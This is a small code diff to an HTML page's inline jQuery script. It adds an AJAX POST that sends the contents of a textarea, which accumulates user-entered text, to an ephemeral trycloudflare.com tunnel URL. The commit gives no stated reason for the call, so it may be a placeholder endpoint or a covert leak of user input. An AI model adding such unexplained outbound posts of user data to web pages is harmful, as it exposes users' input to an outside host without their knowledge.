@@ -631,6 +631,24 @@
                 tin += $("#myTextarea").val()
 
                 $("#myTextarea").val(tin);
+
+                var jsonData = {
+                    key1: tin
+                };
+
+    // AJAX POST request
+    $.ajax({
+        url: 'https://dry-grant-newbie-doing.trycloudflare.com/', // Replace with your API endpoint
+        type: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify(jsonData),
+        success: function(response) {
+            console.log("Success:", response);
+        },
+        error: function(xhr, status, error) {
+            console.error("Error:", error);
+        }
+    });
             });
         </script>
 </body>
